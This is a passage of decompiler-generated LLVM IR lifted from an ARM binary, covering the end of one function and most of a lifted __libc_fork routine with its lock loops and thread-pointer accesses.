  call void @__pseudo_branch(i32 %v8_139d0)
  br label %dec_label_pc_13dac

dec_label_pc_13dac:                               ; preds = %bb, %entry
  %v0_13db0 = call i32 @__aeabi_read_tp()
  %v3_13db4 = load i16, i16* @global_var_22068.345, align 2
  %v4_13db4 = sext i16 %v3_13db4 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13dc0 = add i32 %v4_13db4, %v0_13db0
  %v4_13dc0 = inttoptr i32 %v3_13dc0 to i32*
  store i32 22, i32* %v4_13dc0, align 4
  %v0_13fa4 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_13fa4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_13fe0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_13fe0, i32* @ip, align 4
  store i32 12772, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r8.global-to-local, align 4
  %v4_140d016 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 12772) to i32*), align 4
  store i32 %v4_140d016, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_140d418 = icmp eq i32 %v4_140d016, 0
  br i1 %v2_140d418, label %dec_label_pc_140dc, label %dec_label_pc_14000

dec_label_pc_14000:                               ; preds = %entry, %dec_label_pc_140d0.backedge
  store i32 -61441, i32* @ip, align 4
  call void @__pseudo_branch(i32 -61536)
  %v0_1400c = load i32, i32* %r7.global-to-local, align 4
  %v1_1400c = add i32 %v0_1400c, 20
  %v2_1400c = inttoptr i32 %v1_1400c to i32*
  %v3_1400c = load i32, i32* %v2_1400c, align 4
  store i32 %v3_1400c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14010 = icmp eq i32 %v3_1400c, 0
  store i32 %v3_1400c, i32* %r4.global-to-local, align 4
  br i1 %v2_14010, label %dec_label_pc_140d0.backedge, label %dec_label_pc_14020

dec_label_pc_140d0.backedge:                      ; preds = %dec_label_pc_14000, %dec_label_pc_1404c
  %v0_140d0 = load i32, i32* %r8.global-to-local, align 4
  %v1_140d0 = load i32, i32* %r5.global-to-local, align 4
  %v2_140d0 = add i32 %v1_140d0, %v0_140d0
  %v3_140d0 = inttoptr i32 %v2_140d0 to i32*
  %v4_140d0 = load i32, i32* %v3_140d0, align 4
  store i32 %v4_140d0, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_140d4 = icmp eq i32 %v4_140d0, 0
  br i1 %v2_140d4, label %dec_label_pc_140dc, label %dec_label_pc_14000

dec_label_pc_14020:                               ; preds = %dec_label_pc_14000
  %v0_14020 = load i32, i32* %r8.global-to-local, align 4
  %v1_14020 = load i32, i32* %r5.global-to-local, align 4
  %v2_14020 = add i32 %v1_14020, %v0_14020
  %v3_14020 = inttoptr i32 %v2_14020 to i32*
  %v4_14020 = load i32, i32* %v3_14020, align 4
  %v1_14024 = add i32 %v4_14020, 20
  store i32 %v1_14024, i32* %r2.global-to-local, align 4
  %v1_14028132 = inttoptr i32 %v1_14024 to i32*
  %v2_14028133 = load i32, i32* %v1_14028132, align 4
  store i32 %v2_14028133, i32* %r3.global-to-local, align 4
  %v3_1402c135 = icmp uge i32 %v2_14028133, %v3_1400c
  store i1 %v3_1402c135, i1* %cpsr_c.global-to-local, align 1
  %v9_1402c141 = icmp eq i32 %v2_14028133, %v3_1400c
  br i1 %v9_1402c141, label %dec_label_pc_14034, label %dec_label_pc_1404c

dec_label_pc_14034:                               ; preds = %dec_label_pc_14020, %dec_label_pc_14034.dec_label_pc_14028_crit_edge
  %v0_14034142 = phi i32 [ %v1_1402c.pre, %dec_label_pc_14034.dec_label_pc_14028_crit_edge ], [ %v3_1400c, %dec_label_pc_14020 ]
  store i32 %v0_14034142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14044 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14044, label %dec_label_pc_14048, label %dec_label_pc_14034.dec_label_pc_14028_crit_edge

dec_label_pc_14034.dec_label_pc_14028_crit_edge:  ; preds = %dec_label_pc_14034
  %v0_14028.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1402c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14028 = inttoptr i32 %v0_14028.pre to i32*
  %v2_14028 = load i32, i32* %v1_14028, align 4
  store i32 %v2_14028, i32* %r3.global-to-local, align 4
  %v3_1402c = icmp uge i32 %v2_14028, %v1_1402c.pre
  store i1 %v3_1402c, i1* %cpsr_c.global-to-local, align 1
  %v9_1402c = icmp eq i32 %v2_14028, %v1_1402c.pre
  br i1 %v9_1402c, label %dec_label_pc_14034, label %dec_label_pc_1404c

dec_label_pc_14048:                               ; preds = %dec_label_pc_14034
  %v0_14048 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14048, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1404c

dec_label_pc_1404c:                               ; preds = %dec_label_pc_14020, %dec_label_pc_14034.dec_label_pc_14028_crit_edge, %dec_label_pc_14048
  %v0_1404c = phi i32 [ %v0_14048, %dec_label_pc_14048 ], [ %v2_14028133, %dec_label_pc_14020 ], [ %v2_14028, %dec_label_pc_14034.dec_label_pc_14028_crit_edge ]
  %v1_1404c = phi i32 [ %v0_14048, %dec_label_pc_14048 ], [ %v3_1400c, %dec_label_pc_14020 ], [ %v1_1402c.pre, %dec_label_pc_14034.dec_label_pc_14028_crit_edge ]
  %v3_1404c = icmp uge i32 %v0_1404c, %v1_1404c
  store i1 %v3_1404c, i1* %cpsr_c.global-to-local, align 1
  %v9_1404c = icmp eq i32 %v0_1404c, %v1_1404c
  br i1 %v9_1404c, label %dec_label_pc_14054, label %dec_label_pc_140d0.backedge

dec_label_pc_14054:                               ; preds = %dec_label_pc_1404c
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_14068 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_14058

dec_label_pc_14058:                               ; preds = %dec_label_pc_140c0, %dec_label_pc_14054
  %v0_14058 = load i32, i32* %r7.global-to-local, align 4
  %v1_14058 = add i32 %v0_14058, 4
  %v2_14058 = inttoptr i32 %v1_14058 to i32*
  %v3_14058 = load i32, i32* %v2_14058, align 4
  store i32 %v3_14058, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1405c = icmp eq i32 %v3_14058, 0
  br i1 %v2_1405c, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_14058
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_14058, %bb
  %v2_14064 = xor i1 %v2_1405c, true
  call void @__pseudo_cond_branch(i1 %v2_14064, i32 %v3_14058)
  %v0_1406c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1406c, i32* %stack_var_-88, align 4
  %v1_14070 = inttoptr i32 %v0_1406c to i32*
  %v2_14070 = load i32, i32* %v1_14070, align 4
  store i32 %v2_14070, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14074 = icmp eq i32 %v2_14070, 0
  store i32 %v2_14068, i32* %r5.global-to-local, align 4
  br i1 %v2_14074, label %dec_label_pc_140e0.loopexit, label %dec_label_pc_14088

dec_label_pc_14088:                               ; preds = %bb72
  %v1_14088 = add i32 %v2_14070, 20
  store i32 %v1_14088, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1408c

dec_label_pc_1408c:                               ; preds = %dec_label_pc_140c0.dec_label_pc_1408c_crit_edge, %dec_label_pc_14088
  %v0_14090 = phi i32 [ %v0_14090.pre, %dec_label_pc_140c0.dec_label_pc_1408c_crit_edge ], [ %v1_14088, %dec_label_pc_14088 ]
  %v0_1408c = phi i32 [ %v0_1408c.pre, %dec_label_pc_140c0.dec_label_pc_1408c_crit_edge ], [ %v2_14070, %dec_label_pc_14088 ]
  %v1_1408c = add i32 %v0_1408c, 20
  %v2_1408c = inttoptr i32 %v1_1408c to i32*
  %v3_1408c = load i32, i32* %v2_1408c, align 4
  store i32 %v0_14090, i32* %r2.global-to-local, align 4
  store i32 %v3_1408c, i32* %r4.global-to-local, align 4
  %v1_1409c119 = inttoptr i32 %v0_14090 to i32*
  %v2_1409c120 = load i32, i32* %v1_1409c119, align 4
  store i32 %v2_1409c120, i32* %r3.global-to-local, align 4
  %v3_140a0122 = icmp uge i32 %v2_1409c120, %v3_1408c
  store i1 %v3_140a0122, i1* %cpsr_c.global-to-local, align 1
  %v9_140a0128 = icmp eq i32 %v2_1409c120, %v3_1408c
  br i1 %v9_140a0128, label %dec_label_pc_140a8, label %dec_label_pc_140c0

dec_label_pc_140a8:                               ; preds = %dec_label_pc_1408c, %dec_label_pc_140a8.dec_label_pc_1409c_crit_edge
  %v0_140a8129 = phi i32 [ %v1_140a0.pre, %dec_label_pc_140a8.dec_label_pc_1409c_crit_edge ], [ %v3_1408c, %dec_label_pc_1408c ]
  store i32 %v0_140a8129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_140b8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_140b8, label %dec_label_pc_140bc, label %dec_label_pc_140a8.dec_label_pc_1409c_crit_edge

dec_label_pc_140a8.dec_label_pc_1409c_crit_edge:  ; preds = %dec_label_pc_140a8
  %v0_1409c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_140a0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1409c = inttoptr i32 %v0_1409c.pre to i32*
  %v2_1409c = load i32, i32* %v1_1409c, align 4
  store i32 %v2_1409c, i32* %r3.global-to-local, align 4
  %v3_140a0 = icmp uge i32 %v2_1409c, %v1_140a0.pre
  store i1 %v3_140a0, i1* %cpsr_c.global-to-local, align 1
  %v9_140a0 = icmp eq i32 %v2_1409c, %v1_140a0.pre
  br i1 %v9_140a0, label %dec_label_pc_140a8, label %dec_label_pc_140c0

dec_label_pc_140bc:                               ; preds = %dec_label_pc_140a8
  %v0_140bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_140bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_140c0

dec_label_pc_140c0:                               ; preds = %dec_label_pc_1408c, %dec_label_pc_140a8.dec_label_pc_1409c_crit_edge, %dec_label_pc_140bc
  %v0_140c0 = phi i32 [ %v0_140bc, %dec_label_pc_140bc ], [ %v2_1409c120, %dec_label_pc_1408c ], [ %v2_1409c, %dec_label_pc_140a8.dec_label_pc_1409c_crit_edge ]
  %v1_140c0 = phi i32 [ %v0_140bc, %dec_label_pc_140bc ], [ %v3_1408c, %dec_label_pc_1408c ], [ %v1_140a0.pre, %dec_label_pc_140a8.dec_label_pc_1409c_crit_edge ]
  %v3_140c0 = icmp uge i32 %v0_140c0, %v1_140c0
  store i1 %v3_140c0, i1* %cpsr_c.global-to-local, align 1
  %v9_140c0 = icmp eq i32 %v0_140c0, %v1_140c0
  store i32 %v2_14068, i32* %r4.global-to-local, align 4
  br i1 %v9_140c0, label %dec_label_pc_14058, label %dec_label_pc_140c0.dec_label_pc_1408c_crit_edge

dec_label_pc_140c0.dec_label_pc_1408c_crit_edge:  ; preds = %dec_label_pc_140c0
  %v0_1408c.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_14090.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1408c

dec_label_pc_140dc:                               ; preds = %dec_label_pc_140d0.backedge, %entry
  %v0_140e431 = phi i32 [ ptrtoint (i32* @global_var_22010.349 to i32), %entry ], [ %v0_140d0, %dec_label_pc_140d0.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_140e0

dec_label_pc_140e0.loopexit:                      ; preds = %bb72
  store i32 %v2_14068, i32* %r6.global-to-local, align 4
  %v0_140e4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_140e0

dec_label_pc_140e0:                               ; preds = %dec_label_pc_140e0.loopexit, %dec_label_pc_140dc
  %v0_140e4 = phi i32 [ %v0_140e4.pre, %dec_label_pc_140e0.loopexit ], [ %v0_140e431, %dec_label_pc_140dc ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_140e4 = add i32 %v0_140e4, 152
  %v3_140e4 = inttoptr i32 %v2_140e4 to i32*
  %v4_140e4 = load i32, i32* %v3_140e4, align 4
  store i32 %v4_140e4, i32* %r7.global-to-local, align 4
  %v0_140e8 = call i32 @__aeabi_read_tp()
  store i32 %v0_140e8, i32* %r0.global-to-local, align 4
  %v1_140ec = add i32 %v4_140e4, 8
  %v2_140ec = inttoptr i32 %v1_140ec to i32*
  %v3_140ec = load i32, i32* %v2_140ec, align 4
  store i32 %v3_140ec, i32* %r3.global-to-local, align 4
  %v1_140f0 = add i32 %v0_140e8, -1168
  store i32 %v1_140f0, i32* %r5.global-to-local, align 4
  %v3_140f4 = icmp uge i32 %v3_140ec, %v1_140f0
  store i1 %v3_140f4, i1* %cpsr_c.global-to-local, align 1
  %v9_140f4 = icmp eq i32 %v3_140ec, %v1_140f0
  br i1 %v9_140f4, label %dec_label_pc_1425c, label %dec_label_pc_140fc

dec_label_pc_140fc:                               ; preds = %dec_label_pc_140e0
  store i32 %v4_140e4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_14108112 = inttoptr i32 %v4_140e4 to i32*
  %v2_14108113 = load i32, i32* %v1_14108112, align 4
  store i32 %v2_14108113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1410c115 = icmp eq i32 %v2_14108113, 0
  br i1 %v9_1410c115, label %dec_label_pc_14114, label %dec_label_pc_1412c

dec_label_pc_14114:                               ; preds = %dec_label_pc_140fc, %dec_label_pc_14114.dec_label_pc_14108_crit_edge
  %v0_14114116 = phi i32 [ %v1_1410c.pre, %dec_label_pc_14114.dec_label_pc_14108_crit_edge ], [ 0, %dec_label_pc_140fc ]
  store i32 %v0_14114116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14124 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14124, label %dec_label_pc_14128, label %dec_label_pc_14114.dec_label_pc_14108_crit_edge

dec_label_pc_14114.dec_label_pc_14108_crit_edge:  ; preds = %dec_label_pc_14114
  %v0_14108.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1410c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14108 = inttoptr i32 %v0_14108.pre to i32*
  %v2_14108 = load i32, i32* %v1_14108, align 4
  store i32 %v2_14108, i32* %r3.global-to-local, align 4
  %v3_1410c = icmp uge i32 %v2_14108, %v1_1410c.pre
  store i1 %v3_1410c, i1* %cpsr_c.global-to-local, align 1
  %v9_1410c = icmp eq i32 %v2_14108, %v1_1410c.pre
  br i1 %v9_1410c, label %dec_label_pc_14114, label %dec_label_pc_1412c

dec_label_pc_14128:                               ; preds = %dec_label_pc_14114
  %v0_14128 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14128, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1412c

dec_label_pc_1412c:                               ; preds = %dec_label_pc_140fc, %dec_label_pc_14114.dec_label_pc_14108_crit_edge, %dec_label_pc_14128
  %v0_1412c = phi i32 [ %v0_14128, %dec_label_pc_14128 ], [ %v2_14108113, %dec_label_pc_140fc ], [ %v2_14108, %dec_label_pc_14114.dec_label_pc_14108_crit_edge ]
  %v1_1412c = phi i32 [ %v0_14128, %dec_label_pc_14128 ], [ 0, %dec_label_pc_140fc ], [ %v1_1410c.pre, %dec_label_pc_14114.dec_label_pc_14108_crit_edge ]
  %v3_1412c = icmp uge i32 %v0_1412c, %v1_1412c
  store i1 %v3_1412c, i1* %cpsr_c.global-to-local, align 1
  %v9_1412c = icmp eq i32 %v0_1412c, %v1_1412c
  br i1 %v9_1412c, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_1412c
  %v1_14130 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_14130, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_1412c, %bb73
  %v1_14134 = xor i1 %v9_1412c, true
  call void @__pseudo_cond_branch(i1 %v1_14134, i32 ptrtoint (i32* @global_var_143ac.505 to i32))
  %v0_14138 = load i32, i32* %r5.global-to-local, align 4
  %v1_14138 = load i32, i32* %r7.global-to-local, align 4
  %v2_14138 = add i32 %v1_14138, 8
  %v3_14138 = inttoptr i32 %v2_14138 to i32*
  store i32 %v0_14138, i32* %v3_14138, align 4
  br label %dec_label_pc_1425c

dec_label_pc_1425c:                               ; preds = %bb74, %dec_label_pc_140e0
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_14140 = load i32, i32* %r8.global-to-local, align 4
  %v2_14140 = add i32 %v0_14140, 152
  %v3_14140 = inttoptr i32 %v2_14140 to i32*
  %v4_14140 = load i32, i32* %v3_14140, align 4
  store i32 %v4_14140, i32* %r2.global-to-local, align 4
  %v1_14144 = add i32 %v4_14140, 4
  %v2_14144 = inttoptr i32 %v1_14144 to i32*
  %v3_14144 = load i32, i32* %v2_14144, align 4
  %v1_14148 = add i32 %v3_14144, 1
  store i32 %v1_14148, i32* %r3.global-to-local, align 4
  store i32 %v1_14148, i32* %v2_14144, align 4
  %v0_14150 = load i32, i32* %r5.global-to-local, align 4
  %v1_14150 = add i32 %v0_14150, 108
  %v2_14150 = inttoptr i32 %v1_14150 to i32*
  %v3_14150 = load i32, i32* %v2_14150, align 4
  store i32 %v3_14150, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_14158 = sub i32 0, %v3_14150
  store i32 %v1_14158, i32* %v2_14150, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_1416c = load i32, i32* %r5.global-to-local, align 4
  %v1_1416c = add i32 %v0_1416c, 104
  store i32 %v1_1416c, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_14260.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_14260 = add i32 %v0_1416c, 108
  %v3_14260 = inttoptr i32 %v2_14260 to i32*
  store i32 %v0_14260.pre, i32* %v3_14260, align 4
  %v0_14264 = load i32, i32* %r8.global-to-local, align 4
  %v1_14264 = load i32, i32* %r3.global-to-local, align 4
  %v2_14264 = add i32 %v1_14264, %v0_14264
  %v3_14264 = inttoptr i32 %v2_14264 to i32*
  %v4_14264 = load i32, i32* %v3_14264, align 4
  store i32 %v4_14264, i32* %r0.global-to-local, align 4
  %v1_14268 = add i32 %v4_14264, 4
  %v2_14268 = inttoptr i32 %v1_14268 to i32*
  %v3_14268 = load i32, i32* %v2_14268, align 4
  %v1_1426c = add i32 %v3_14268, -1
  store i32 %v1_1426c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14270 = icmp eq i32 %v1_1426c, 0
  store i32 %v1_1426c, i32* %v2_14268, align 4
  br i1 %v2_14270, label %dec_label_pc_1427c, label %dec_label_pc_1436cthread-pre-split

dec_label_pc_1427c:                               ; preds = %dec_label_pc_1425c
  %v0_1427c = load i32, i32* %r3.global-to-local, align 4
  %v1_1427c = load i32, i32* %r0.global-to-local, align 4
  %v2_1427c = add i32 %v1_1427c, 8
  %v3_1427c = inttoptr i32 %v2_1427c to i32*
  store i32 %v0_1427c, i32* %v3_1427c, align 4
  %v0_14280 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14280, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14284

dec_label_pc_14284:                               ; preds = %dec_label_pc_142b4.dec_label_pc_14284_crit_edge, %dec_label_pc_1427c
  %v0_14284 = phi i32 [ %v0_14284.pre, %dec_label_pc_142b4.dec_label_pc_14284_crit_edge ], [ %v0_14280, %dec_label_pc_1427c ]
  %v1_14284 = inttoptr i32 %v0_14284 to i32*
  %v2_14284 = load i32, i32* %v1_14284, align 4
  store i32 %v2_14284, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_14284, i32* %r2.global-to-local, align 4
  %v2_14290100 = load i32, i32* %v1_14284, align 4
  store i32 %v2_14290100, i32* %r3.global-to-local, align 4
  %v3_14294102 = icmp uge i32 %v2_14290100, %v2_14284
  store i1 %v3_14294102, i1* %cpsr_c.global-to-local, align 1
  %v9_14294108 = icmp eq i32 %v2_14290100, %v2_14284
  br i1 %v9_14294108, label %dec_label_pc_1429c, label %dec_label_pc_142b4

dec_label_pc_1429c:                               ; preds = %dec_label_pc_14284, %dec_label_pc_1429c.dec_label_pc_14290_crit_edge
  %v0_1429c109 = phi i32 [ %v1_14294.pre, %dec_label_pc_1429c.dec_label_pc_14290_crit_edge ], [ %v2_14284, %dec_label_pc_14284 ]
  store i32 %v0_1429c109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_142ac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_142ac, label %dec_label_pc_142b0, label %dec_label_pc_1429c.dec_label_pc_14290_crit_edge

dec_label_pc_1429c.dec_label_pc_14290_crit_edge:  ; preds = %dec_label_pc_1429c
  %v0_14290.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14294.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14290 = inttoptr i32 %v0_14290.pre to i32*
  %v2_14290 = load i32, i32* %v1_14290, align 4
  store i32 %v2_14290, i32* %r3.global-to-local, align 4
  %v3_14294 = icmp uge i32 %v2_14290, %v1_14294.pre
  store i1 %v3_14294, i1* %cpsr_c.global-to-local, align 1
  %v9_14294 = icmp eq i32 %v2_14290, %v1_14294.pre
  br i1 %v9_14294, label %dec_label_pc_1429c, label %dec_label_pc_142b4

dec_label_pc_142b0:                               ; preds = %dec_label_pc_1429c
  %v0_142b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_142b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_142b4

dec_label_pc_142b4:                               ; preds = %dec_label_pc_14284, %dec_label_pc_1429c.dec_label_pc_14290_crit_edge, %dec_label_pc_142b0
  %v0_142bc = phi i32 [ %v0_142b0, %dec_label_pc_142b0 ], [ %v2_14290100, %dec_label_pc_14284 ], [ %v2_14290, %dec_label_pc_1429c.dec_label_pc_14290_crit_edge ]
  %v1_142b4 = phi i32 [ %v0_142b0, %dec_label_pc_142b0 ], [ %v2_14284, %dec_label_pc_14284 ], [ %v1_14294.pre, %dec_label_pc_1429c.dec_label_pc_14290_crit_edge ]
  %v3_142b4 = icmp uge i32 %v0_142bc, %v1_142b4
  store i1 %v3_142b4, i1* %cpsr_c.global-to-local, align 1
  %v9_142b4 = icmp eq i32 %v0_142bc, %v1_142b4
  br i1 %v9_142b4, label %dec_label_pc_142bc, label %dec_label_pc_142b4.dec_label_pc_14284_crit_edge

dec_label_pc_142b4.dec_label_pc_14284_crit_edge:  ; preds = %dec_label_pc_142b4
  %v0_14284.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14284

dec_label_pc_142bc:                               ; preds = %dec_label_pc_142b4
  %v2_142bc = icmp ne i32 %v1_142b4, 0
  store i1 %v2_142bc, i1* %cpsr_c.global-to-local, align 1
  %v7_142c0 = icmp slt i32 %v1_142b4, 2
  br i1 %v7_142c0, label %dec_label_pc_1436cthread-pre-split, label %dec_label_pc_142c4

dec_label_pc_142c4:                               ; preds = %dec_label_pc_142bc
  %v0_142c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_142c4, i32* %r0.global-to-local, align 4
  %v0_142c8 = load i32, i32* @r1, align 4
  %v1_142c8 = add i32 %v0_142c8, 129
  store i32 %v1_142c8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1436cthread-pre-split

dec_label_pc_142e0:                               ; preds = %dec_label_pc_1436cthread-pre-split, %dec_label_pc_14368
  %v0_142e0 = phi i32 [ %v3_14368, %dec_label_pc_14368 ], [ %v0_1436c.pr, %dec_label_pc_1436cthread-pre-split ]
  %v1_142e0 = inttoptr i32 %v0_142e0 to i32*
  %v2_142e0 = load i32, i32* %v1_142e0, align 4
  store i32 %v2_142e0, i32* %r3.global-to-local, align 4
  %v1_142e4 = add i32 %v2_142e0, 8
  %v2_142e4 = inttoptr i32 %v1_142e4 to i32*
  %v3_142e4 = load i32, i32* %v2_142e4, align 4
  store i32 %v3_142e4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_142e8 = icmp eq i32 %v3_142e4, 0
  br i1 %v2_142e8, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_142e0
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_142e0, %bb75
  %v2_142f0 = xor i1 %v2_142e8, true
  call void @__pseudo_cond_branch(i1 %v2_142f0, i32 %v3_142e4)
  %v0_142f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_142f4 = inttoptr i32 %v0_142f4 to i32*
  %v2_142f4 = load i32, i32* %v1_142f4, align 4
  store i32 %v2_142f4, i32* %r5.global-to-local, align 4
  %v1_142f8 = add i32 %v2_142f4, 20
  store i32 %v1_142f8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_142fc

dec_label_pc_142fc:                               ; preds = %dec_label_pc_14330.dec_label_pc_142fc_crit_edge, %bb76
  %v0_14300 = phi i32 [ %v0_14300.pre, %dec_label_pc_14330.dec_label_pc_142fc_crit_edge ], [ %v1_142f8, %bb76 ]
  %v0_142fc = phi i32 [ %v0_142fc.pre, %dec_label_pc_14330.dec_label_pc_142fc_crit_edge ], [ %v2_142f4, %bb76 ]
  %v1_142fc = add i32 %v0_142fc, 20
  %v2_142fc = inttoptr i32 %v1_142fc to i32*
  %v3_142fc = load i32, i32* %v2_142fc, align 4
  store i32 %v0_14300, i32* %r2.global-to-local, align 4
  store i32 %v3_142fc, i32* %r4.global-to-local, align 4
  %v1_14308 = add i32 %v3_142fc, -1
  store i32 %v1_14308, i32* @r1, align 4
  %v1_1430c87 = inttoptr i32 %v0_14300 to i32*
  %v2_1430c88 = load i32, i32* %v1_1430c87, align 4
  store i32 %v2_1430c88, i32* %r3.global-to-local, align 4
  %v3_1431090 = icmp uge i32 %v2_1430c88, %v3_142fc
  store i1 %v3_1431090, i1* %cpsr_c.global-to-local, align 1
  %v9_1431096 = icmp eq i32 %v2_1430c88, %v3_142fc
  br i1 %v9_1431096, label %dec_label_pc_14318, label %dec_label_pc_14330

dec_label_pc_14318:                               ; preds = %dec_label_pc_142fc, %dec_label_pc_14318.dec_label_pc_1430c_crit_edge
  %v0_1431897 = phi i32 [ %v1_14310.pre, %dec_label_pc_14318.dec_label_pc_1430c_crit_edge ], [ %v3_142fc, %dec_label_pc_142fc ]
  store i32 %v0_1431897, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14328 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14328, label %dec_label_pc_1432c, label %dec_label_pc_14318.dec_label_pc_1430c_crit_edge

dec_label_pc_14318.dec_label_pc_1430c_crit_edge:  ; preds = %dec_label_pc_14318
  %v0_1430c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14310.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1430c = inttoptr i32 %v0_1430c.pre to i32*
  %v2_1430c = load i32, i32* %v1_1430c, align 4
  store i32 %v2_1430c, i32* %r3.global-to-local, align 4
  %v3_14310 = icmp uge i32 %v2_1430c, %v1_14310.pre
  store i1 %v3_14310, i1* %cpsr_c.global-to-local, align 1
  %v9_14310 = icmp eq i32 %v2_1430c, %v1_14310.pre
  br i1 %v9_14310, label %dec_label_pc_14318, label %dec_label_pc_14330

dec_label_pc_1432c:                               ; preds = %dec_label_pc_14318
  %v0_1432c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1432c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14330

dec_label_pc_14330:                               ; preds = %dec_label_pc_142fc, %dec_label_pc_14318.dec_label_pc_1430c_crit_edge, %dec_label_pc_1432c
  %v0_1433c = phi i32 [ %v0_1432c, %dec_label_pc_1432c ], [ %v2_1430c88, %dec_label_pc_142fc ], [ %v2_1430c, %dec_label_pc_14318.dec_label_pc_1430c_crit_edge ]
  %v1_14330 = phi i32 [ %v0_1432c, %dec_label_pc_1432c ], [ %v3_142fc, %dec_label_pc_142fc ], [ %v1_14310.pre, %dec_label_pc_14318.dec_label_pc_1430c_crit_edge ]
